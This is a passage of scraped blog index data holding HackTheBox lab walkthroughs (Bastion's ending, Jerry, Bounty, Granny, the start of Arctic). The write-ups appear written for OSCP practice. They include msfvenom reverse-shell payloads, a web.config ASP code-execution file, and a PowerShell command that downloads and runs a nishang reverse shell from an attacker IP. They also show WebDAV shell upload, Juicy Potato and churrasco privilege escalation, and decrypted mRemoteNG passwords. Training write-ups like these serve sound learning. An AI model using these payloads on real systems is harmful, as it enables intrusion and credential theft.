https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.HTTP request sent, awaiting response... 200 OKLength: 16974 (17K) [text/plain]Saving to: ‘jaws-enum.ps1’jaws-enum.ps1 100%[============================================================================&amp;gt;] 16.58K --.-KB/s in 0.02s 2021-08-14 23:53:57 (939 KB/s) - ‘jaws-enum.ps1’ saved [16974/16974]$ scp jaws-enum.ps1 L4mpje@$TARGET:L4mpje@10.10.10.134&#39;s password: jaws-enum.ps1 100% 17KB 77.9KB/s 00:00Then, execute it via powershell:l4mpje@BASTION C:\\Users\\L4mpje&amp;gt;powershellWindows PowerShellCopyright (C) 2016 Microsoft Corporation. All rights reserved.PS C:\\Users\\L4mpje&amp;gt; .\\jaws-enum.ps1 There is an application that looks unique:PrivescThis script will decrypt passwords stored by mRemoteNG.We need to grab a configuration file in :\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG\\ that contains a password:Here we go!$ python3 mremoteng_decrypt.py -s yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esBPassword: bureaulampje$ python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==Password: thXLHM96BeKL0ER2Useful links Execution via .SCF mRemoteNG-Decrypt" }, { "title": "HackTheBox - Jerry", "url": "/htb-jerry/", "categories": "Hackthebox walkthroughs, Windows, Easy", "tags": "gobuster, nikto, tomcat, war, default credentials, hydra, msfvenom, htb-windows-easy, writeup, oscp-prep", "date": "2021-08-15 06:36:34 +0700", "snippet": "Enumerationnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Jerry-full-port-scan.txt 10.10.10.95Nmap scan report for 10.10.10.95Host is up (0.11s latency).Not shown: 65534 filtered portsPORT STATE SERVICE VERSION8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1|_http-favicon: Apache Tomcat|_http-server-header: Apache-Coyote/1.1|_http-title: Apache Tomcat/7.0.88Port 80 (Apache Tomcat/7.0.88)gobuster$ gobuster dir -u http://$TARGET:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x .jsp===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.10.95:8080[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: jsp[+] Timeout: 10s===============================================================2021/08/14 20:48:16 Starting gobuster in directory enumeration mode===============================================================/aux (Status: 200) [Size: 0]/com2 (Status: 200) [Size: 0]/com3 (Status: 200) [Size: 0]/com4 (Status: 200) [Size: 0]/com1 (Status: 200) [Size: 0]/con (Status: 200) [Size: 0]/docs (Status: 302) [Size: 0] [--&amp;gt; /docs/]/examples (Status: 302) [Size: 0] [--&amp;gt; /examples/]/favicon.ico (Status: 200) [Size: 21630] /host-manager (Status: 302) [Size: 0] [--&amp;gt; /host-manager/]/index.jsp (Status: 200) [Size: 11398] /lpt2 (Status: 200) [Size: 0] /lpt1 (Status: 200) [Size: 0] /manager (Status: 302) [Size: 0] [--&amp;gt; /manager/] /nul (Status: 200) [Size: 0] ===============================================================2021/08/14 20:49:58 Finished===============================================================Since I was curious, I looked for exploits against Apache Tomcat/7.0.88:$ searchsploit Tomcat 7.0.88---------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Apache Tomcat &amp;lt; 9.0.1 (Beta) / &amp;lt; 8.5.23 / &amp;lt; 8.0.47 / &amp;lt; 7.0.8 - JSP Upload Bypass / Remote Code Execution (1) | windows/webapps/42953.txtApache Tomcat &amp;lt; 9.0.1 (Beta) / &amp;lt; 8.5.23 / &amp;lt; 8.0.47 / &amp;lt; 7.0.8 - JSP Upload Bypass / Remote Code Execution (2) | jsp/webapps/42966.py---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsBut it appears that the server was not vulnerable:niktonikto revealed that the credentials to access the /manager are the default ones: username: tomcat password: s3cret We could also bruteforce them using hydra:$ hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 $TARGET http-get /manager/htmlOnce authenticated, the first thing that should come to our eyes is the fact that we can deploy WAR files:ExploitationFirst we need to create a malicious WAR file using msfvenom, then we can start a listener:$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=$(vpnip) LPORT=1234 -f war &amp;gt; shell.warPayload size: 1102 bytesFinal size of war file: 1102 bytes$ nc -lnvp 1234listening on [any] 1234 ...If we click on List applications or if we simply refresh the page, the shell application should appear:Clicking on it will execute it. Then we have a shell as 😯 … SYSTEM!!!C:\\Users\\Administrator\\Desktop\\flags&amp;gt;type &quot;2 for the price of 1.txt&quot; type &quot;2 for the price of 1.txt&quot;user.txt7004dbcef0f854e0fb401875f26ebd00root.txt04a8b36e1545a455393d067e772fe90eInteresting links C2 - SILENTTRINITY" }, { "title": "HackTheBox - Bounty", "url": "/htb-bounty/", "categories": "Hackthebox walkthroughs, Windows, Easy", "tags": "Microsoft IIS, gobuster, Burp Intruder, web.config, RCE, nishang, powershell, SeImpersonatePrivilege, msfvenom, Juicy Potato, htb-windows-easy, writeup, oscp-prep", "date": "2021-08-15 01:08:40 +0700", "snippet": "Enumerationnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Bounty-full-port-scan.txt 10.10.10.93Nmap scan report for 10.10.10.93Host is up (0.11s latency).Not shown: 65534 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 7.5| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/7.5|_http-title: BountyService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsPort 80 (Microsoft-IIS/7.5)gobuster$ gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x .txt,.aspx=====================================================/aspnet_client (Status: 301) [Size: 156] [--&amp;gt; http://10.10.10.93/aspnet_client/]/transfer.aspx (Status: 200) [Size: 941]/uploadedfiles (Status: 301) [Size: 156] [--&amp;gt; http://10.10.10.93/uploadedfiles/]=====================================================After trying to upload a file with the .aspx extension, we encounter this error message:However, if we just change the extension to .jpg, the file will be successfully uploaded into the /uploadedfiles folder:Burp IntruderIn order to figure out which extensions are allowed on this web server, we’ll be using Burp Intruder. Here are the steps: Enable FoxyProxy (or install it if you don’t) Run Burp and ensure Intercept is on Upload a file with the .jpg extension Go to the Proxy Tab and send the HTTP request to the Intruder Go to to the Positions tab, click on Clear, then select the .jpg and click twice on Add to append payload markers. Then you can write whatever you want between them: In the example above, I forgot to remove the dot before the §EXTENSION§ Everything between these symbols will be replaced by our payload list.I used /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-extensions-lowercase.txt: Make sure to uncheck URL encode and click on Start attack:As we can see in the screenshot below, extension returning HTTP response with a length of 1350 are accepted by the web server.After looking for “IIS 7 .config reverse shell”, we can find two guided articles on how to get remote code extension by uploading web.config file: Hacktricks - Execute .config files Uploading web.config for Fun and Profit 2Uploading this file results in running ASP code on the target server:&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;configuration&amp;gt; &amp;lt;system.webServer&amp;gt; &amp;lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&amp;gt; &amp;lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\\system32\\inetsrv\\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&amp;gt; &amp;lt;/handlers&amp;gt; &amp;lt;security&amp;gt; &amp;lt;requestFiltering&amp;gt; &amp;lt;fileExtensions&amp;gt; &amp;lt;remove fileExtension=&quot;.config&quot; /&amp;gt; &amp;lt;/fileExtensions&amp;gt; &amp;lt;hiddenSegments&amp;gt; &amp;lt;remove segment=&quot;web.config&quot; /&amp;gt; &amp;lt;/hiddenSegments&amp;gt; &amp;lt;/requestFiltering&amp;gt; &amp;lt;/security&amp;gt; &amp;lt;/system.webServer&amp;gt;&amp;lt;/configuration&amp;gt;&amp;lt;!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!&amp;lt;%Response.write(&quot;-&quot;&amp;amp;&quot;-&amp;gt;&quot;)&#39; it is running the ASP code if you can see 3 by opening the web.config file!Response.write(1+2)Response.write(&quot;&amp;lt;!-&quot;&amp;amp;&quot;-&quot;)%&amp;gt;--&amp;gt;ExploitationIf we replace the content of web.config by the following:&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;configuration&amp;gt; &amp;lt;system.webServer&amp;gt; &amp;lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&amp;gt; &amp;lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\\system32\\inetsrv\\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&amp;gt; &amp;lt;/handlers&amp;gt; &amp;lt;security&amp;gt; &amp;lt;requestFiltering&amp;gt; &amp;lt;fileExtensions&amp;gt; &amp;lt;remove fileExtension=&quot;.config&quot; /&amp;gt; &amp;lt;/fileExtensions&amp;gt; &amp;lt;hiddenSegments&amp;gt; &amp;lt;remove segment=&quot;web.config&quot; /&amp;gt; &amp;lt;/hiddenSegments&amp;gt; &amp;lt;/requestFiltering&amp;gt; &amp;lt;/security&amp;gt; &amp;lt;/system.webServer&amp;gt;&amp;lt;/configuration&amp;gt;&amp;lt;!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!&amp;lt;%Response.write(&quot;-&quot;&amp;amp;&quot;-&amp;gt;&quot;)Set rs = CreateObject(&quot;WScript.Shell&quot;)Set cmd = rs.Exec(&quot;cmd /c whoami&quot;)o = cmd.StdOut.Readall()Response.write(o)Response.write(&quot;&amp;lt;!-&quot;&amp;amp;&quot;-&quot;)%&amp;gt;--&amp;gt;We get the result of the whoami command:Okay now let’s upload a reverse shell script (via nishang) and execute it from the web server:$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1$ echo &quot;&quot; &amp;gt;&amp;gt; shell.ps1 $ echo &quot;Invoke-PowerShellTcp -Reverse -IPAddress $(vpnip) -Port 1234&quot; &amp;gt;&amp;gt; shell.ps1 Run a listener with rlwrap nc -lnvp 1234 as well as a web server via python3 -m http.server 80. Replace the Set cmd variable in the web.config file by this one: Set cmd = rs.Exec(&quot;cmd /c powershell -c iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.12/shell.ps1&#39;)&quot;)Upload the new web.config file and open it from your web browser / or by using curl and we got a shell:PrivescIf we take a look at our privileges, we can see that SeImpersonatePrivilege is enabled so we probably can run Juicy Potato exploit:PS C:\\windows\\system32\\inetsrv&amp;gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ========================================= ========SeAssignPrimaryTokenPrivilege Replace a process level token DisabledSeIncreaseQuotaPrivilege Adjust memory quotas for a process DisabledSeAuditPrivilege Generate security audits DisabledSeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeIncreaseWorkingSetPrivilege Increase a process working set DisabledThis privilege is designed to allow a service to impersonate other users on the system. Juicy Potato exploits the way Microsoft handles tokens in order to escalate local privileges to SYSTEM.We can get the executable from the releases page and upload it to the target web server:(New-Object System.Net.WebClient).DownloadFile(&#39;http://10.10.14.12/JuicyPotato.exe&#39;,&quot;c:\\Windows\\System32\\spool\\drivers\\color\\JuicyPotato.exe&quot;)In order to use this exploit, we need a program to launch. We will be using a reverse shell executable generated via msfvenom:$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$(vpnip) LPORT=53 -f exe -o privesc.exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 460 bytesFinal size of exe file: 7168 bytesSaved as: privesc.exeThen we transfer it to the target machine:(New-Object System.Net.WebClient).DownloadFile(&#39;http://10.10.14.12/privesc.exe&#39;,&quot;c:\\Windows\\System32\\spool\\drivers\\color\\privesc.exe&quot;)Finally we can execute it and get a shell as SYSTEM:PS C:\\Windows\\System32\\spool\\drivers\\color&amp;gt; .\\JuicyPotato.exe -l 1337 -p privesc.exe -t *Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337....[+] authresult 0{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\\SYSTEM[+] CreateProcessWithTokenW OKUseful links Hacktricks - Execute .config files Uploading web.config for Fun and Profit 2 THM - Burp Suite C2 server Merlin nishang - Invoke-PowerShellTcp.ps1 Juicy Potato" }, { "title": "HackTheBox - Granny", "url": "/htb-granny/", "categories": "Hackthebox walkthroughs, Windows, Easy", "tags": "Microsoft IIS, WebDav, gobuster, PUT, curl, aspx, msfvenom, reverse-shell, Windows-Exploit-Suggester, Impacket, smbserver.py, churrasco.exe, SeImpersonatePrivilege, htb-windows-easy, writeup, oscp-prep", "date": "2021-08-14 08:40:02 +0700", "snippet": "Enumerationnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Granny-full-port-scan.txt 10.10.10.15 Nmap scan report for 10.10.10.15Host is up (0.12s latency).Not shown: 65534 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 6.0| http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT|_http-server-header: Microsoft-IIS/6.0|_http-title: Under Construction| http-webdav-scan: | Server Type: Microsoft-IIS/6.0| Server Date: Fri, 13 Aug 2021 22:54:23 GMT| WebDAV type: Unknown| Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK|_ Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCHService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsPort 80 (Microsoft IIS httpd 6.0)gobuster$ gobuster dir -u http://10.10.10.15 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x .txt -o services/80-http.txt===============================================================/Images (Status: 301) [Size: 149] [--&amp;gt; http://10.10.10.15/Images/]/_private (Status: 301) [Size: 153] [--&amp;gt; http://10.10.10.15/%5Fprivate/]/_vti_bin (Status: 301) [Size: 155] [--&amp;gt; http://10.10.10.15/%5Fvti%5Fbin/]/_vti_bin/_vti_adm/admin.dll (Status: 200) [Size: 195] /_vti_bin/_vti_aut/author.dll (Status: 200) [Size: 195] /_vti_bin/shtml.dll (Status: 200) [Size: 96] /_vti_log (Status: 301) [Size: 155] [--&amp;gt; http://10.10.10.15/%5Fvti%5Flog/]/aspnet_client (Status: 301) [Size: 158] [--&amp;gt; http://10.10.10.15/aspnet%5Fclient/]/images (Status: 301) [Size: 149] [--&amp;gt; http://10.10.10.15/images/] ===============================================================WebDavAs for Grandpa, we identified that the target is using the WebDav protocol and the HTTP PUT method is allowed. This could potentially give us the ability to upload files.We can verify that using the davtest tool:$ davtest --url http://$TARGET******************************************************** Testing DAV connectionOPEN SUCCEED: http://10.10.10.15********************************************************NOTE Random string for this session: tWrff7dBAGc3LT******************************************************** Creating directoryMKCOL SUCCEED: Created http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT******************************************************** Sending test filesPUT html SUCCEED: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.htmlPUT cgi FAILPUT jsp SUCCEED: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.jspPUT shtml FAILPUT aspx FAILPUT pl SUCCEED: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.plPUT asp FAILPUT php SUCCEED: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.phpPUT jhtml SUCCEED: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.jhtmlPUT txt SUCCEED: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.txtPUT cfm SUCCEED: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.cfm******************************************************** Checking for test file executionEXEC html SUCCEED: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.htmlEXEC jsp FAILEXEC pl FAILEXEC php FAILEXEC jhtml FAILEXEC txt SUCCEED: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.txtEXEC cfm FAIL********************************************************/usr/bin/davtest Summary:Created: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LTPUT File: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.htmlPUT File: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.jspPUT File: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.plPUT File: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.phpPUT File: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.jhtmlPUT File: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.txtPUT File: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.cfmExecutes: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.htmlExecutes: http://10.10.10.15/DavTestDir_tWrff7dBAGc3LT/davtest_tWrff7dBAGc3LT.txtThis time we can upload arbitrary files to the web server.Exploitationgobuster revealed a folder called /aspnet_clientLet’s try to upload an aspx reverse shell:$ msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=$(vpnip) LPORT=1234 -o shell.aspx[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 324 bytesFinal size of aspx file: 2695 bytesSaved as: shell.aspx$ mv shell.aspx shell.txt$ curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.txt$ curl -X MOVE --header &#39;Destination:http://10.10.10.15/shell.aspx&#39; &#39;http://10.10.10.15/shell.txt&#39;Run a listener using netcat, curl the uploaded file and we have a shell:Privesc (without Metasploit)systeminfoC:\\WINDOWS\\Temp&amp;gt;systeminfosysteminfoHost Name: GRANNYOS Name: Microsoft(R) Windows(R) Server 2003, Standard EditionOS Version: 5.2.3790 Service Pack 2 Build 3790OS Manufacturer: Microsoft CorporationOS Configuration: Standalone ServerOS Build Type: Uniprocessor FreeRegistered Owner: HTBRegistered Organization: HTBProduct ID: 69712-296-0024942-44782Original Install Date: 4/12/2017, 5:07:40 PMSystem Up Time: 0 Days, 0 Hours, 42 Minutes, 21 SecondsSystem Manufacturer: VMware, Inc.System Model: VMware Virtual PlatformSystem Type: X86-based PCProcessor(s): 1 Processor(s) Installed. [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 MhzBIOS Version: INTEL - 6040000Windows Directory: C:\\WINDOWSSystem Directory: C:\\WINDOWS\\system32Boot Device: \\Device\\HarddiskVolume1System Locale: en-us;English (United States)Input Locale: en-us;English (United States)Time Zone: (GMT+02:00) Athens, Beirut, Istanbul, MinskTotal Physical Memory: 1,023 MBAvailable Physical Memory: 778 MBPage File: Max Size: 2,470 MBPage File: Available: 2,317 MBPage File: In Use: 153 MBPage File Location(s): C:\\pagefile.sysDomain: HTBLogon Server: N/AHotfix(s): 1 Hotfix(s) Installed. [01]: Q147222Network Card(s): N/ANow we can use Windows-Exploit-Suggester.py:$ wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py$ pip2.7 install xlrd==1.2.0$ python windows-exploit-suggester.py --update[*] initiating winsploit version 3.3...[+] writing to file 2021-08-14-mssb.xls[*] done$ root@kali:~/htb/machines/Windows/Granny# python windows-exploit-suggester.py --database 2021-08-14-mssb.xls --systeminfo systeminfo.txt[*] initiating winsploit version 3.3...[*] database file detected as xls or xlsx based on extension[*] attempting to read from the systeminfo input file[+] systeminfo input file read successfully (ascii)[*] querying database file for potential vulnerabilities[*] comparing the 1 hotfix(es) against the 356 potential bulletins(s) with a database of 137 known exploits[*] there are now 356 remaining vulns[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin[+] windows version identified as &#39;Windows 2003 SP2 32-bit&#39;[*] [M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important[*] https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC[*] https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF[*] [E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical[*] https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC[*] https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC[*] https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC[*] [E] MS14-070: Vulnerability in TCP/IP Could Allow Elevation of Privilege (2989935) - Important[*] http://www.exploit-db.com/exploits/35936/ -- Microsoft Windows Server 2003 SP2 - Privilege Escalation, PoC[*] [E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical[*] http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC[*] [M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical[*] https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC[*] http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC[*] http://www.exploit-db.com/exploits/35229/ -- Internet Explorer &amp;lt;= 11 - OLE Automation Array Remote Code Execution (#1), PoC[*] http://www.exploit-db.com/exploits/35230/ -- Internet Explorer &amp;lt; 11 - OLE Automation Array Remote Code Execution (MSF), MSF[*] http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF[*] http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF[*] [M] MS14-062: Vulnerability in Message Queuing Service Could Allow Elevation of Privilege (2993254) - Important[*] http://www.exploit-db.com/exploits/34112/ -- Microsoft Windows XP SP3 MQAC.sys - Arbitrary Write Privilege Escalation, PoC[*] http://www.exploit-db.com/exploits/34982/ -- Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation[*] [M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical[*] http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF[*] [E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important[*] https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC[*] https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC[*] [E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical[E] MS14-029: Security Update for Internet Explorer (2962482) - Critical[*] http://www.exploit-db.com/exploits/34458/[*] [E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important[*] http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC[*] [M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important[E] MS14-002: Vulnerability in Windows Kernel Could Allow Elevation of Privilege (2914368) - Important[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical[M] MS13-071: Vulnerability in Windows Theme File Could Allow Remote Code Execution (2864063) - Important[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical[*] http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp;amp; EMET 5., PoC[*] http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp;amp; EMET 5.0 Bypass (MS12-037), PoC[*] [M] MS11-080: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (2592799) - Important[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical[M] MS09-065: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (969947) - Critical[M] MS09-053: Vulnerabilities in FTP Service for Internet Information Services Could Allow Remote Code Execution (975254) - Important[M] MS09-020: Vulnerabilities in Internet Information Services (IIS) Could Allow Elevation of Privilege (970483) - Important[M] MS09-004: Vulnerability in Microsoft SQL Server Could Allow Remote Code Execution (959420) - Important[M] MS09-002: Cumulative Security Update for Internet Explorer (961260) (961260) - Critical[M] MS09-001: Vulnerabilities in SMB Could Allow Remote Code Execution (958687) - Critical[M] MS08-078: Security Update for Internet Explorer (960714) - Critical[*] doneThe output shows either public exploits (E), or Metasploit modules (M) as indicated by the character value. I tried many of those, but I think the shell was too unstable to run the exploits correctly.Then, I looked at the privileges of the user:So I decided to look at Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation .I ran an SMB server on my Kali machine in order to transfer the exploit file churrasco.exe to the target:$ wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali ....I executed churrasco.exe then I got SYSTEM:Useful links Windows-Exploit-Suggester.py Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation churrasco.exe OSCP Prep v6: 3 Easy OSCP-Similar HTB Machines in Less Than 20 minutes (Manual Exploitation)" }, { "title": "HackTheBox - Arctic", "url": "/htb-arctic/", "categories": "Hackthebox walkthroughs, Windows, Easy", "tags": "fmtp, Adobe ColdFusion, FCKeditor, CVE-2009-2265, JSP, msfvenom, metasploit, meterpreter, shell to meterpreter, multi_handler, suggester, MS10-092, htb-windows-easy, writeup, oscp-prep", "date": "2021-08-14 02:58:31 +0700", "snippet": "Enumerationnmap scan$ nmap -sV -sC -p- -oN Arctic-full-port-scan.txt 10.10.10.11Nmap scan report for 10.10.10.11Host is up (0.10s latency).Not shown: 65532 filtered portsPORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC8500/tcp open fmtp?49154/tcp open msrpc Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsPort 8500 (fmtp)The port 8500 is running FMTP. It takes about 20-30 seconds to perform every request, so we have to wait a little bit before seeing two folders: CFIDE and cfdocs.If we go to the administrator folder in CFIDE, a page is loading with ColdFusion 8 written:If we take a look at searchsploit, we can see there are many exploits available:FootholdMost of the scripts are cross-site scripting but there is a particular script than abuses a RCE vulnerability:Adobe ColdFusion 8 - Remote Command Execution (RCE) | cfm/webapps/50057.pyLet’s get this script:$ searchsploit -m cfm/webapps/50057.py Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE) URL: https://www.exploit-db.com/exploits/50057 Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.pyFile Type: Python script, ASCII text executable, with CRLF line terminatorsCopied to: 